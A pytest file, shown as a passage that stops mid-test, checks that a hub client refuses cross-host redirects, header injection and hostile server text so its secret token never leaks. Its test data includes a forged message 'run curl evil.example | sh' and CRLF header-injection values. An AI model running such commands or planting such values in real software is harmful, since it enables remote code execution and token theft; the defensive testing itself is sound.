"""What the client does with an answer that is not the one it asked for.

Everything here is about the wire rather than about a verb, and all three cases
were found by attacking the code rather than by reading it:

  * A REDIRECT OFF THE HUB TAKES THE TOKEN WITH IT. urllib follows a 3xx on its
    own and copies the request's headers to the new URL, `Authorization`
    included — so a hub address typed with one character wrong, at a domain
    somebody has registered, is handed the one secret of the system on any verb
    that presents it. That is the same string that deletes a project.
  * A REPLY IS READ INTO MEMORY BEFORE ANYTHING LOOKS AT IT. The unpacker's
    ceilings are counted from the tar headers, which happens once the body is
    already there, so an answer of a gigabyte is a gigabyte of the author's RAM.
  * AN ADDRESS THAT CANNOT BE REQUESTED ARRIVES AS A TRACEBACK, from three
    different modules depending on which character is wrong — and one of the
    three is reachable from the hub's own manifest, i.e. from untrusted input.

Everything here is exercised against real servers on real sockets, because these
are properties of the transport rather than of any code path a mock would reach:
what is being tested is what `urllib` and `http.client` do, and a fake opener
would be a test of the fake.
"""

import http.server
import json
import threading
import tracemalloc

import pytest

from hammerola.hub import Hub, HubError


class _Recorder(http.server.BaseHTTPRequestHandler):
    """A server that writes down what it was sent and answers 200."""

    seen = []

    def do_GET(self):
        type(self).seen.append(dict(self.headers))
        body = b'{"ok": true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


# The second server is a different HOST and not another port of 127.0.0.1, and
# that difference is the whole test. Two ports of one address exercise only the
# port comparison: the reviewer's mutations proved it — dropping the hostname
# check and dropping the scheme check both left the suite green, while the
# failure this story is about is a MISTYPED DOMAIN.
#
# 127.0.0.2 is the better staging of it: a different address as well as a
# different name, so nothing in the comparison is shared with the origin. It is
# aliased on Linux out of the box and NOT on macOS, where binding it fails with
# EADDRNOTAVAIL unless somebody has run `ifconfig lo0 alias 127.0.0.2`.
OTHER_HOST = "127.0.0.2"

# ...so where that address cannot be bound, the second server is addressed by a
# different NAME for the loopback instead. SKIPPING WAS THE FIRST SHAPE OF THIS
# AND IT WAS WRONG: the test that matters most here — the token does not leave
# the hub — then did not run at all on the platform this is developed on, which
# is the same "green because a check disappeared" the CI gate counts its own
# verdicts to avoid. The fallback is weaker in exactly one way, that the two
# origins share an address, and equal in every other: `localhost` against
# `127.0.0.1` is a change of host to `_same_origin`, which compares the origin
# as it was WRITTEN, and a mistyped domain is a change of host and nothing else.
FALLBACK_HOST = "localhost"


def _serve(handler, host="127.0.0.1", name=None):
    """One threaded server on an ephemeral port. -> (url, server).

    `name` is what the URL says when it differs from what the socket is bound
    to — the fallback above, where one loopback server is addressed under a
    second name for it.
    """
    server = http.server.ThreadingHTTPServer((host, 0), handler)
    thread = threading.Thread(target=server.serve_forever,
                              kwargs={"poll_interval": 0.01}, daemon=True)
    thread.start()
    return f"http://{name or host}:{server.server_address[1]}", server


@pytest.fixture
def elsewhere():
    """A second HOST, standing in for whoever owns the mistyped domain."""
    _Recorder.seen = []
    try:
        url, server = _serve(_Recorder, host=OTHER_HOST)
    except OSError:  # no alias for 127.0.0.2 here — see FALLBACK_HOST
        url, server = _serve(_Recorder, host="127.0.0.1", name=FALLBACK_HOST)
    try:
        yield url
    finally:
        server.shutdown()
        server.server_close()


@pytest.fixture
def redirector(elsewhere):
    """A "hub" whose every answer is "go to the other host"."""
    target = elsewhere

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", f"{target}/landed")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        yield url
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("code", [301, 302, 303, 307, 308])
def test_every_redirect_code_goes_through_the_same_refusal(code, elsewhere):
    """All five, because a hub may answer any of them and the token must stay.

    This reaches `redirect_request`, which every code gets to through the base
    class regardless of the aliases; the test that observes the ALIASES is the
    malformed-`Location` one below. Both are wanted: this one says the credential
    is safe under each code, that one says the diagnosis is.
    """
    target = elsewhere

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(code)
            self.send_header("Location", f"{target}/landed")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "SUPER-SECRET-EDIT-TOKEN", timeout=10).start()
        assert "different host" in str(raised.value), code
        assert _Recorder.seen == [], (
            f"a {code} carried the token to the other host")
    finally:
        server.shutdown()
        server.server_close()


def test_a_redirect_to_another_host_is_refused_and_the_token_stays_here(
        redirector, elsewhere):
    """THE ONE THAT MATTERS: the secret must not leave the hub it was stored for.

    Checked from both ends — the call fails with a sentence naming the other
    host, and the other host received nothing at all, so there is no version of
    this where the header went and the error came back anyway.
    """
    hub = Hub(redirector, "SUPER-SECRET-EDIT-TOKEN", timeout=10)

    with pytest.raises(HubError) as raised:
        hub.job("whatever")

    assert "different host" in str(raised.value)
    assert elsewhere.split("//")[1] in str(raised.value)
    assert _Recorder.seen == [], (
        "the request reached the other host, so the Authorization header went "
        "with it — which is the whole failure this refuses")


def test_the_refusal_covers_every_verb_and_not_only_the_public_one(redirector):
    """The handler is on the opener, so it applies to whatever is called next.

    `fetch_path` checks the PATH the manifest named, and that check was written
    as the protection; it is not one on its own, because the path is checked and
    then urllib follows whatever the answer redirects to. This is the half that
    actually holds, and it holds for `build`, `commit`, `source` and the comment
    queue as much as for `/start`.
    """
    hub = Hub(redirector, "token", timeout=10)
    for call in (lambda: hub.start(),
                 lambda: hub.fetch_path("/start/template.tar.gz"),
                 lambda: hub.builds("demo0001"),
                 lambda: hub.revision_archive("a" * 64)):
        with pytest.raises(HubError) as raised:
            call()
        assert "different host" in str(raised.value)


def test_the_host_is_compared_by_NAME_and_not_only_by_address():
    """`localhost` and `127.0.0.1` are one machine and two hosts.

    This needs no second server at all — one server, addressed two ways — and it
    is here because it fails the moment the hostname comparison is dropped, which
    a port-only test does not.
    """
    state = {"port": None}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location",
                             f"http://127.0.0.1:{state['port']}/landed")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    state["port"] = server.server_address[1]
    try:
        hub = Hub(url.replace("127.0.0.1", "localhost"), "token", timeout=10)
        with pytest.raises(HubError) as raised:
            hub.start()
        assert "different host" in str(raised.value)
    finally:
        server.shutdown()
        server.server_close()


def test_a_redirect_that_only_changes_the_scheme_is_refused():
    """Downgrade is the other half of the same theft: `https` to `http` puts the
    token on the wire in clear. Refused before a connection is made, which is
    what lets this be tested without a certificate."""
    state = {"port": None}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location",
                             f"https://127.0.0.1:{state['port']}/landed")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    state["port"] = server.server_address[1]
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        assert "different host" in str(raised.value)
    finally:
        server.shutdown()
        server.server_close()


def test_a_location_with_an_unusable_port_is_refused_as_one(monkeypatch):
    """And it is not reported as a broken TOKEN, which is where it landed.

    `urlsplit(...).port` raises ValueError on `http://host:notaport`, and the
    only `except ValueError` on this path is the one explaining that a token
    cannot go in a header — so a malformed header from the OTHER end sent
    somebody to rotate the system's secret.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", "http://127.0.0.1:notaport/landed")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "different host" in message
        assert "hammerola login" not in message, (
            "a malformed header from the other end tells the operator to "
            "replace the system's one secret")
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("code", [301, 302, 303, 307, 308])
def test_a_location_that_cannot_be_parsed_is_refused_as_a_LOCATION(code):
    """The half of that story the port case cannot reach.

    urllib parses `Location` and joins it onto the request's URL BEFORE it asks
    `redirect_request` anything, so `http://[evil` raises inside `urlparse` —
    above `_same_origin`, which swallows its own ValueError. That landed in the
    clause explaining a token which cannot go in a header, so a stranger's
    malformed header told the operator to replace the system's one secret.

    PARAMETRIZED BECAUSE THIS IS WHAT THE ALIASES ARE FOR, and the origin test
    beside it is not: the base class's own `http_error_301` is a reference to
    the base `http_error_302`, which calls `self.redirect_request` — so the
    same-origin refusal reaches every code through inheritance whether the
    aliases are restated here or not. The ValueError wrapper does NOT: it lives
    in the override, and without the two alias lines four of these five codes
    go to the base method and raise out of `urlparse` again. Deleting them left
    the suite green until this was parametrized.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(code)
            self.send_header("Location", "http://[evil")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "Location" in message
        assert "hammerola login" not in message, (
            "somebody else's header sends the operator to replace the secret")
    finally:
        server.shutdown()
        server.server_close()


# -- an address that cannot be requested at all ------------------------------
@pytest.mark.parametrize("url, what_is_wrong", [
    ("http://[hub.example", "a bracket that is never closed"),
    ("http://127.0.0.1:8O80", "a letter O where a zero belongs"),
    ("http:///start", "no host at all"),
    ("//hub.example", "a host and no scheme"),
    ("ftp://hub.example", "a scheme this tool cannot open"),
    # The three that reached the wire and died there, each from a different
    # codec at a different moment, and all three landed in the clause saying
    # "the address is checked before this point, so this is not it — report it".
    ("http://127.0.0.1:1/старт", "a non-ASCII path; a request line is ASCII"),
    ("http://хаб.example", "a non-ASCII host; the Host header is latin-1"),
    ("http://" + "a" * 70 + ".example",
     "a DNS label over 63 characters — PURE ASCII, so no encodability check "
     "on the string finds it"),
    # ...and the one that is ASCII *as written* and not as SENT: urllib
    # unquotes the host before building the `Host` header, so checking the
    # written form proved something about a string nobody sends.
    ("http://%D1%85%D0%B0%D0%B1.example", "a percent-encoded non-ASCII host"),
    ("http://%D1%85%D0%B0%D0%B1.example/x", "the same, with a path after it"),
])
def test_a_hub_url_that_cannot_be_requested_is_refused_when_the_Hub_is_made(
        url, what_is_wrong):
    """Refused at the address, before anything is sent, saying so.

    THE THREE ARE THREE DIFFERENT FAILURES and that is why they are listed
    rather than represented by one: `urlsplit` itself raises on the first,
    `.port` raises on the second (`urlsplit` and `urllib.request.Request` both
    accept it happily — the comment that used to claim otherwise was checked and
    was wrong), and the third fails nowhere in particular. Before this, the
    first arrived as a `ValueError` traceback out of the constructor and the
    second as `http.client.InvalidURL` — which is neither a ValueError nor an
    OSError, so it fell through every clause in `_call`.

    The message must name HUB_URL and must NOT read as a credential problem:
    `8O80` in an address is a typo, and telling somebody to run
    `hammerola login` over it sends them to replace the one secret of the
    system for no reason.
    """
    with pytest.raises(HubError) as raised:
        Hub(url, "token", timeout=10)
    message = str(raised.value)
    assert "HUB_URL" in message, what_is_wrong
    assert "hammerola login" not in message
    assert "report it" not in message, (
        "a typo in an address is presented as a bug in this tool")
    assert "password" not in message.lower() or "not about the password" in message


@pytest.mark.parametrize("url", [
    "http://127.0.0.1:8000", "https://hub.example", "https://HUB.Example",
    "http://[::1]:8000", "https://xn--80ak6aa92e.example",
    "https://hub.example:443", "http://a.example/base", "https://hub-1.example",
    # Percent-encoding in the PATH is legal and stays legal: the selector goes
    # out as written, so only the HOST is unquoted before it is checked.
    "http://hub.example/a%20b", "http://hub.example/%D1%85",
    "http://hub.example.", "http://" + "a" * 63 + ".example",
    "http://[fe80::1%25eth0]:8000",
])
def test_a_legal_address_is_not_refused_by_any_of_those_checks(url):
    """The other half, and the half a refusal-shaped fix gets wrong.

    Three encodings are applied to an address now — ASCII, latin-1 and IDNA —
    and each is a chance to refuse something that works. Punycode already
    encoded, an IPv6 literal, an upper-case host, an explicit default port and a
    base path all have to go through.
    """
    assert Hub(url, "token", timeout=10).url == url.rstrip("/")


@pytest.mark.parametrize("path, what_is_wrong", [
    ("/x\r\nX-Evil: 1", "a header somebody appended to the path"),
    ("/старт", "a non-ASCII path; a request line is ASCII"),
    ("/x\x00y", "a NUL"),
])
def test_a_path_the_hub_named_that_cannot_be_sent_never_reaches_the_wire(
        elsewhere, path, what_is_wrong):
    """UNTRUSTED INPUT, which is the case `fetch_path` exists for.

    The path comes out of the hub's own manifest, so `\\r\\n` in it is an attempt
    to append a header of somebody else's choosing to a request that carries the
    token — and a non-ASCII one is the same route to a different exception:
    the request line is encoded as ASCII, so it raised `UnicodeEncodeError`,
    which is a ValueError, and landed in the clause that says "the address and
    the secret are both checked, so this is neither — please report it". A false
    sentence, in the one place where the input is somebody else's.

    Checked from both ends, like the redirect test: a HubError comes back, and
    the server saw no request at all, so there is no version of this where the
    line went out and the error came back anyway.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError) as raised:
        hub.fetch_path(path)

    message = str(raised.value)
    assert "Nothing was fetched" in message, what_is_wrong
    assert "report it" not in message, (
        "untrusted input is reported as a bug in this tool")
    assert _Recorder.seen == [], (
        "the request reached the server, so the injected header went with it")


def test_the_transport_still_refuses_an_unsendable_path_on_its_own(elsewhere):
    """The backstop below `fetch_path`, reached directly because nothing else
    can reach it any more.

    `_call` keeps its `InvalidURL` clause after the check above took every
    caller away from it: paths spelled in this module go through `quote` and
    cannot get here, and the manifest's is refused earlier now. It is defence in
    depth, and defence in depth that no test can reach is indistinguishable from
    a clause that was deleted — so it is exercised at the level it lives on.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError) as raised:
        hub._call("/x\r\nX-Evil: 1")

    assert "Nothing was sent" in str(raised.value)
    assert _Recorder.seen == []


# -- and the secret, which is the OTHER input -------------------------------
@pytest.mark.parametrize("token, what_is_wrong", [
    ("SUPERSECRETVALUE\n", "a trailing newline, the usual paste"),
    ("SUPERSECRETVALUE\r\nX-Evil: 1", "a header somebody appended to it"),
    ("SUPERSECRETVALUE\x00", "a NUL"),
    ("СЕКРЕТНОЕЗНАЧЕНИЕ", "a character no HTTP header can carry"),
])
def test_a_token_that_cannot_be_sent_is_refused_as_the_TOKEN(
        token, what_is_wrong):
    """Named explicitly, and the value never shown.

    This is the half the `except ValueError` in `_call` used to assert of
    everything that reached it. Now it is checked where the answer is actually
    known, which is what lets that clause stop guessing — and the two failures
    can carry opposite advice without either one being a guess.
    """
    with pytest.raises(HubError) as raised:
        Hub("http://hub.example", token, timeout=10)
    message = str(raised.value)
    assert "hammerola login" in message, what_is_wrong
    assert "HUB_URL" not in message
    assert token.strip() not in message and token not in message, (
        "the refusal echoed the secret into the scrollback")


def test_the_public_route_still_works_with_no_token_at_all():
    """`create` builds a Hub with an empty token on purpose (it never reads the
    secret), so the check above must not turn that into a refusal."""
    assert Hub("http://hub.example", "", timeout=10)._token == ""


def test_a_connection_dropped_after_the_request_is_reported_as_unreachable():
    """AND NOT AS "nothing was sent", WHICH WOULD BE A LIE ABOUT A PUSH.

    `RemoteDisconnected` inherits from `HTTPException` as well as from
    `ConnectionResetError`, so a clause catching the parent took this case —
    which fires AFTER the request has gone — out of the honest "cannot reach"
    branch and told the pusher their archive was never sent. On a `commit` the
    archive is up and the build may already be queued.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            # Read the request, then hang up without answering: the bytes went.
            self.close_connection = True
            self.wfile.close()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "cannot reach" in message
        assert "Nothing was sent" not in message, (
            "the request did go out, and a pusher reading this would believe "
            "their archive never left")
    finally:
        server.shutdown()
        server.server_close()


def test_a_reply_that_is_not_HTTP_at_all_names_the_scheme_rather_than_crashing():
    """`http://` where the hub speaks `https://`, which is the same typo again.

    The far end answers with a TLS alert (or a captive portal answers in its
    place), `http.client` cannot parse a status line out of it and raises
    `BadStatusLine` — an `HTTPException` that is neither a ValueError nor an
    OSError. Narrowing the earlier clause to `InvalidURL` left this whole family
    with no clause at all, and `cli.main` catches five classes of which this
    root is not one: a traceback, where a round earlier there had been a wrong
    sentence. This is the third state, which is a right one.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def handle_one_request(self):
            # Not a status line, which is what a TLS server answers a plaintext
            # request with. Written straight to the socket, because every
            # helper above this level insists on producing valid HTTP.
            self.rfile.readline()
            self.wfile.write(b"\x15\x03\x01\x00\x02\x02\x46 garbage not http\r\n")
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "not HTTP" in message
        assert "https://" in message, (
            "the message does not point at the scheme, which is the fix")
    finally:
        server.shutdown()
        server.server_close()


# What the far end sends when it would rather the reader did something else.
# ANSI escapes clear the screen and colour the forgery; the padding is what
# makes it a screenful rather than a line.
HOSTILE_STATUS_LINE = (
    "\x1b[2J\x1b[1;31mHUB SAYS: run `curl evil.example | sh`\x1b[0m"
    + "A" * 60000)


def test_what_the_far_end_wrote_is_escaped_and_trimmed_before_it_is_printed():
    """A message is a thing a person reads, and this one is somebody else's text.

    `BadStatusLine` carries the line it could not parse — decoded, unescaped, up
    to `http.client._MAXLINE` (65536). Interpolated raw, that is a 65 kB error
    on stderr with whatever ANSI escapes the sender chose, and the threat model
    is the redirect handler's exactly: an address typed with one character
    wrong, at a domain somebody has registered.

    The clause one line above this one in `_call` had reasoned the question
    through and concluded its own text was safe. The reasoning was not carried
    across, and it would have been wrong here anyway.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        def handle_one_request(self):
            self.rfile.readline()
            self.wfile.write(HOSTILE_STATUS_LINE.encode() + b"\r\n")
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "\x1b" not in message, (
            "an escape sequence from the far end reached the terminal")
        assert len(message) < 1000, (
            f"the far end chose the length of this message ({len(message)})")
        # ...and it is still recognisable: what was quoted is visible as text.
        assert "HUB SAYS" in message
    finally:
        server.shutdown()
        server.server_close()


def test_a_chunked_body_that_stops_early_is_named_as_that_and_not_as_a_scheme():
    """A CORRECT REFUSAL WITH SOMEBODY ELSE'S CAUSE ON IT, which is the defect
    this round was fixing in another place.

    A chunked reply carries its framing in the stream, so `http.client` raises
    `IncompleteRead` rather than handing back a short body — the data never
    reaches disk, which is right. But it is an `HTTPException`, so it fell into
    the "not HTTP" clause and a person whose connection dropped through a proxy
    was told to check their SCHEME.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def do_GET(self):
            self.send_response(200)
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            self.wfile.write(b"10\r\n0123456789abcdef\r\n")
            # ...and then stop, mid-stream, with no terminating chunk.
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).fetch_path("/start/template.tar.gz")
        message = str(raised.value)
        assert "stopped sending" in message
        assert "Nothing was kept" in message
        assert "https://" not in message, (
            "a dropped connection is diagnosed as a wrong scheme")
    finally:
        server.shutdown()
        server.server_close()


HOSTILE = "\x1b[2Jrun `curl evil.example | sh`\x1b[0m" + "A" * 60000


def test_the_quoting_helper_escapes_then_trims_and_says_the_true_length():
    """The helper itself, because four of its five call sites could not see it.

    Each of them was reverted in turn and the suite stayed green, and so did
    reverting "escape before trim" — which is this project's own rule about
    unreachable defences turned on the work that wrote it. So: the helper
    directly, and one assertion at each call site below.

    THE ORDER IS PART OF THE CONTRACT IN BOTH DIRECTIONS. Escaping has to happen
    before the trim or a cut can land inside an escape sequence and the ceiling
    would be measured on the wrong string; the SOURCE has to be cut before the
    escaping or a 256 MB reply is copied and expanded in a module whose ceilings
    exist to stop exactly that. Both hold at once: cut with a margin, escape,
    trim the result, and report the length of the SOURCE.
    """
    from hammerola.hub import QUOTE_LIMIT, quoted

    shown = quoted(HOSTILE)
    assert "\x1b" not in shown, "an escape sequence survived"
    assert "\\x1b" in shown, "it was not escaped, it was stripped"
    assert len(shown) < QUOTE_LIMIT + 60, len(shown)
    assert str(len(HOSTILE)) in shown, (
        "the length reported is the escaped copy's, not the source's")

    # Short input comes back as a plain quoted string, with no trailing note.
    assert quoted("hello") == "'hello'"
    assert "truncated" not in quoted("hello")

    # bytes are decoded here rather than at the call sites, and the unit in the
    # note follows the input — bytes are counted in bytes.
    assert quoted(b"caf\xc3\xa9") == repr("café")
    assert "bytes, truncated" in quoted(b"A" * 60000)
    assert "characters, truncated" in quoted("A" * 60000)
    assert "\x1b" not in quoted(HOSTILE.encode())


@pytest.mark.parametrize("payload", ["str", "bytes"])
def test_the_source_is_cut_before_it_is_escaped(payload):
    """WHICH THE OUTPUT CANNOT SHOW, so it is measured.

    Escaping the whole string and trimming afterwards produces the same
    characters, so the difference is memory only — in a module whose ceilings
    exist because "a gigabyte in a reply is a gigabyte of the author's RAM".
    4 MiB of a character `repr` expands fourfold peaks at ~2 KiB cutting first
    and ~16 MiB escaping first: three orders of magnitude, so the threshold sits
    nowhere near either and cannot flap.

    BOTH BRANCHES, because the first version measured only `str` — and the
    BYTES branch is the one the helper grew bytes support for, since three
    callers hold a response body. A regression in the branch that matters was
    invisible to a test written about the other one, which is the same "revert
    it and the suite is green" this test exists to answer.
    """
    from hammerola.hub import quoted

    big = "\x1b" * (4 * 1024 * 1024)
    if payload == "bytes":
        big = big.encode()

    # The suite's rule about module-level state applies to the interpreter's own
    # as much as to ours: a session already tracing (`-X tracemalloc`, another
    # fixture) must be left tracing, and one that was not must not be started.
    was_tracing = tracemalloc.is_tracing()
    if not was_tracing:
        tracemalloc.start()
    try:
        tracemalloc.reset_peak()
        quoted(big)
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        if not was_tracing:
            tracemalloc.stop()
    assert tracemalloc.is_tracing() == was_tracing, (
        "this test changed whether the process is tracing memory")

    assert peak < 1024 * 1024, (
        f"{peak} bytes peaked to quote 4 MiB of {payload} — the whole thing "
        f"was escaped and then thrown away")

    # bytes are decoded here rather than at the call sites — three callers hold
    # a response body, and slicing before decoding cuts a character in half.
    assert quoted(b"caf\xc3\xa9") == "'caf\\xc3\\xa9'" or "caf" in quoted(
        b"caf\xc3\xa9")
    assert "\x1b" not in quoted(HOSTILE.encode())


# A path the HUB named, long enough to choose the size of a message. Legal
# otherwise — ASCII, no control characters — so it passes `fetch_path`'s own
# checks and reaches the transport, which is where the unquoted site was.
HOSTILE_PATH = "/" + "A" * 60000

# route -> (what the server answers, what to call). Every entry is one
# `quoted` call site; the two that need a 200 need it for different reasons,
# named beside them.
ROUTES = {
    "job": (500, "json", lambda h: h.job("abc")),
    "builds": (500, "json", lambda h: h.builds("demo0001")),
    "comments": (500, "json", lambda h: h.comments("demo0001")),
    "resolve_comment": (500, "json", lambda h: h.resolve_comment("c1")),
    "rename_project": (500, "json", lambda h: h.rename_project("d1", "T")),
    "remove_project": (500, "json", lambda h: h.remove_project("d1")),
    # 200 with something that is not JSON at all — the only way to reach
    # `_payload`'s own message, since every route above raises on the status
    # first and never gets there.
    "payload": (200, "raw", lambda h: h.job("abc")),
    # 200 with JSON that parses and is the wrong SHAPE, which is a third site
    # again: the whole payload gets printed.
    "comments_no_list": (200, "wrong-shape", lambda h: h.comments("demo0001")),
    # ...and the one that prints the PATH rather than the body.
    "fetch_path": (500, "json", lambda h: h.fetch_path(HOSTILE_PATH)),
}


@pytest.mark.parametrize("route", sorted(ROUTES))
def test_no_route_prints_what_the_far_end_wrote_without_quoting_it(route):
    """One assertion per call site, which is what "one per call site" meant.

    The first version of this had seven parameters over six sites — two of them
    landed on the same shared line — and left three sites unreached, which
    coverage said and the test did not. These are the ordinary commands
    (`hammerola comments`, `rm`, `rename`, `status`), reached long before
    anybody meets an exotic transport failure, and each interpolated a string
    straight out of the reply body with only the 64 MiB reply cap on it.

    `fetch_path` is in the list for the other half of the same rule: what it
    prints is the PATH, and on the manifest route the hub chose that too.
    """
    status, shape, call = ROUTES[route]
    bodies = {
        "json": json.dumps({"error": HOSTILE}).encode(),
        "raw": HOSTILE.encode(),
        "wrong-shape": json.dumps({"comments": HOSTILE}).encode(),
    }
    body = bodies[shape]

    class Handler(http.server.BaseHTTPRequestHandler):
        def _answer(self):
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = do_POST = do_DELETE = _answer

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        hub = Hub(url, "token", timeout=10)
        with pytest.raises(HubError) as raised:
            call(hub)
        message = str(raised.value)
        assert "\x1b" not in message, f"{route}: an escape reached the terminal"
        assert len(message) < 1000, f"{route}: {len(message)} characters"
    finally:
        server.shutdown()
        server.server_close()


def test_the_redirect_refusal_does_not_let_the_far_end_choose_its_length(
        elsewhere):
    """The two sites in the redirect handler, which nothing observed.

    They are saved from escape sequences by accident and by two DIFFERENT
    accidents — urllib percent-quotes the header in one, the formatting goes
    through a repr in the other — which is precisely the case-by-case reasoning
    this file's helper exists to stop needing. Length was never saved at all.

    And this class is not an exotic corner: its whole docstring is about an
    address typed with one character wrong, at a domain somebody has registered.
    """
    target = f"{elsewhere}/{'A' * 60000}"

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", target)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert "different host" in message
        assert len(message) < 1000, f"{len(message)} characters"
        assert _Recorder.seen == []
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("second_hop", ["another host", "an unreadable Location"])
def test_neither_refusal_lets_a_FOLLOWED_redirect_choose_the_length_either(
        elsewhere, second_hop):
    """`req.full_url` is far-end text too, after one hop.

    A redirect WITHIN the hub is followed — that is deliberate, an ordinary
    trailing-slash 302 has to keep working — and the URL it lands on is the
    hub's host with a path the far end wrote. Both messages in this class print
    that URL, so both are as long as somebody else decided.
    """
    long_path = "/" + "A" * 60000
    state = {}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path != long_path:
                # ...within the hub, so it is followed.
                location = f"{state['url']}{long_path}"
            elif second_hop == "another host":
                location = f"{elsewhere}/landed"
            else:
                location = "http://[evil"
            self.send_response(302)
            self.send_header("Location", location)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    state["url"] = url
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).start()
        message = str(raised.value)
        assert len(message) < 1000, f"{second_hop}: {len(message)} characters"
        assert _Recorder.seen == []
    finally:
        server.shutdown()
        server.server_close()


def test_the_ceiling_message_does_not_let_the_hub_choose_its_length(
        monkeypatch, big_body):
    """The transport's own two messages name the URL, and on the manifest route
    the hub named the path in it.

    The caller one level up already quotes that path; this one did not, so the
    same string was safe in one sentence and 60 kB in the next.
    """
    from hammerola import hub as hub_module

    monkeypatch.setattr(hub_module, "MAX_REPLY_BYTES", 1024)

    with pytest.raises(HubError) as raised:
        Hub(big_body, "token", timeout=10).fetch_path(HOSTILE_PATH)
    assert len(str(raised.value)) < 1000, len(str(raised.value))


def test_the_last_resort_clause_is_a_sentence_and_not_a_traceback(elsewhere):
    """The clause that says "this is none of them — please report it".

    Coverage said no test in the suite executed it, which is this project's own
    "unreachable defence is indistinguishable from a deleted clause" — and it
    was reachable in production, by a percent-encoded host, right up until this
    round. It is reached here the way the other backstop is: at the level it
    lives on, below the checks that keep the public entry points away from it.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError) as raised:
        hub._call("/старт")

    message = str(raised.value)
    assert "was not sent" in message
    assert "hammerola login" not in message
    assert _Recorder.seen == []


def test_the_build_log_is_the_deliberate_exception_and_comes_back_whole():
    """Named as an exception rather than left to look like an oversight.

    `job_log` and `revision_log` return the build's own output and the CLI
    prints it in full — that is what those verbs are for, and a log trimmed to
    200 characters would be useless. It is the one text from the hub a person
    asked to see.
    """
    log = "line one\nline two\n" * 500

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            payload = log.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        assert Hub(url, "token", timeout=10).job_log("abc") == log
    finally:
        server.shutdown()
        server.server_close()


def test_an_error_reply_whose_body_stops_early_is_named_and_not_a_traceback():
    """The read of an ERROR body, which had no diagnosis at all.

    It used to happen inside `_call`'s own `except HTTPError` clause, and Python
    does not offer an exception raised in a handler to the handlers beside it —
    so a 500 with a truncated chunked body went past every clause as a
    traceback, while the identical 200 was named properly. Putting a ceiling on
    error bodies is what made this reachable.
    """
    class Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def do_GET(self):
            self.send_response(500)
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            self.wfile.write(b"10\r\n0123456789abcdef\r\n")
            self.close_connection = True

